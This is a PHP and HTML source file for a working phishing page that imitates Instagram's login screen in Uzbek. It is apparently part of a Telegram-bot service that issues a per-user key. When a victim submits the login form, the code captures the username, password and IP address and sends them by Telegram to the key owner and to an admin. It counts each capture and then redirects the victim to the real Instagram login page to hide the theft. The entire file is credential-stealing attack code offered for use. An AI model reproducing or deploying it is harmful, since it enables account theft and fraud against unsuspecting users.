<?php
require_once __DIR__ . '/config.php';

// Kalitni tekshirish
$key = isset($_GET['id']) ? trim($_GET['id']) : '';
if ($key === '') {
    http_response_code(404);
    exit("404 Not Found");
}

$chat_id = getUserFromKey($key);
if (!$chat_id) {
    http_response_code(404);
    exit("404 Not Found - Invalid or expired key");
}

$pdo = getDB();
$stmt = $pdo->prepare("SELECT * FROM users WHERE chat_id = ?");
$stmt->execute([$chat_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);
if (!$user) {
    http_response_code(404);
    exit("404 Not Found");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    $ip = client_ip();
    
    // Ma'lumotlarni saqlash
    $cols = $pdo->query("PRAGMA table_info(users)")->fetchAll(PDO::FETCH_ASSOC);
    $has_instagram = false; 
    foreach ($cols as $c) { 
        if ($c['name'] === 'instagram_logins') { 
            $has_instagram = true; 
            break; 
        } 
    }
    if (!$has_instagram) {
        $pdo->exec("ALTER TABLE users ADD COLUMN instagram_logins INTEGER DEFAULT 0");
    }
    
        $admn = ADMIN_ID; // config.php ichida belgilangan bo'lishi kerak
    // Telegramga xabar yuborish
    $text = "📱 <b>Instagram Login Ma'lumotlari</b>\n\n";
    $text .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
    $text .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
    $text .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n";
    $text .= "🕒 <b>Vaqt:</b> " . date('Y-m-d H:i:s') . "\n";
     $text .= "👤 <b>Foydalanuvchi:</b> tg://user?id=$chat_id\n";
    
    tgRequest('sendMessage', [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
        tgRequest('sendMessage', [
        'chat_id' => $admn,
        'text' => $text,
        'parse_mode' => 'HTML'
    ]);
    
    // Hisoblagichni yangilash
    $upd = $pdo->prepare("UPDATE users SET instagram_logins = COALESCE(instagram_logins,0) + 1 WHERE chat_id = ?");
    $upd->execute([$chat_id]);
    
    // Log yozish
    logActivity($chat_id, 'instagram_login_captured', "Instagram login qabul qilindi");
    
    // Asl Instagram sahifasiga yo'naltirish
    header("Location: https://www.instagram.com/accounts/login/");
    exit;
}
?>
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 350px;
            width: 100%;
        }
        
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 30px 40px;
            text-align: center;
        }
        
        .instagram-logo {
            font-family: 'Billabong', cursive;
            font-size: 42px;
            margin: 10px 0 30px 0;
            color: #262626;
            font-weight: normal;
        }
        
        .login-form input {
            width: 100%;
            padding: 12px 8px;
            margin: 4px 0;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            font-size: 14px;
            color: #262626;
        }
        
        .login-form input::placeholder {
            color: #8e8e8e;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #a8a8a8;
        }
        
        .login-btn {
            width: 100%;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            margin: 12px 0;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }
        
        .login-btn:disabled {
            background: #b2dffc;
            cursor: default;
        }
        
        .login-btn:hover:not(:disabled) {
            background: #1877f2;
        }
        
        .divider {
            margin: 20px 0;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #dbdbdb;
            margin: 0 10px;
        }
        
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin: 15px 0;
        }
        
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }
        
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        
        .language-selector {
            text-align: center;
            margin: 20px 0;
            font-size: 12px;
            color: #8e8e8e;
        }
        
        .language-selector select {
            border: none;
            background: none;
            color: #00376b;
            font-size: 12px;
            cursor: pointer;
            margin: 0 5px;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0095f6;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 18px;
            color: #333;
        }
        
        .hidden-form {
            display: none;
        }

        /* Billabong font for Instagram logo */
        @font-face {
            font-family: 'Billabong';
            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
        }

        .footer-links {
            text-align: center;
            margin: 20px 0;
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer-links a {
            color: #00376b;
            text-decoration: none;
            margin: 0 5px;
        }
    </style>
</head>
<body>
    <!-- Loading overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Instagram tizimiga kirilmoqda...</div>
    </div>

    <!-- Asosiy Instagram sahifasi (yashirin) -->
    <div id="mainContent" class="hidden-form">
        <div class="container">
            <div class="login-box">
                <div class="instagram-logo">Instagram</div>
                <form class="login-form" id="loginForm" method="POST">
                    <input type="text" name="username" placeholder="Telefon raqam, foydalanuvchi nomi yoki elektron pochta" required>
                    <input type="password" name="password" placeholder="Parol" required>
                    <button type="submit" class="login-btn">Kirish</button>
                </form>
                
                <div class="divider">YOKI</div>
                
                <a href="#" class="forgot-password">Parolni unutdingizmi?</a>
            </div>
            
            <div class="signup-box">
                Hisobingiz yo'qmi? <a href="#">Ro'yxatdan o'ting</a>
            </div>

            <div class="language-selector">
                <select>
                    <option value="uz">O'zbek</option>
                    <option value="ru">Русский</option>
                    <option value="en">English</option>
                </select>
            </div>

            <div class="footer-links">
                <a href="#">Meta</a>
                <a href="#">Haqida</a>
                <a href="#">Blog</a>
                <a href="#">Ish joylari</a>
                <a href="#">Yordam</a>
                <a href="#">API</a>
                <a href="#">Maxfiylik</a>
                <a href="#">Shartlar</a>
                <a href="#">Eng mashhur hisoblar</a>
                <a href="#">Hashtaglar</a>
                <a href="#">Manzillar</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Yuklab olish</a>
            </div>

            <div class="language-selector">
                © 2024 Instagram from Meta
            </div>
        </div>
    </div>

    <script>
        (function(){
            const key = "<?php echo htmlspecialchars($key, ENT_QUOTES); ?>";
            
            // 3 soniyadan keyin asosiy sahifani ko'rsatish
            setTimeout(function() {
                document.getElementById('loadingOverlay').style.display = 'none';
                document.getElementById('mainContent').classList.remove('hidden-form');
                
                // Formani yuborishni kuzatish
                document.getElementById('loginForm').addEventListener('submit', function(e) {
                    e.preventDefault();
                    
                    const formData = new FormData(this);
                    const username = formData.get('username');
                    const password = formData.get('password');
                    
                    if (username && password) {
                        fetch('reel?id=' + encodeURIComponent(key), {
                            method: 'POST',
                            body: formData
                        }).then(function() {
                            // Asl Instagram sahifasiga o'tish
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        }).catch(function() {
                            // Xatolik bo'lsa ham asl sahifaga o'tish
                            window.location.href = 'https://www.instagram.com/accounts/login/';
                        });
                    } else {
                        // Ma'lumotlar to'liq bo'lmasa ham asl sahifaga o'tish
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }
                });

                // Til selectorini sozlash
                const languageSelector = document.querySelector('.language-selector select');
                languageSelector.addEventListener('change', function() {
                    // Til o'zgartirish logikasi
                });
            }, 3000);
        })();
    </script>
</body>
</html>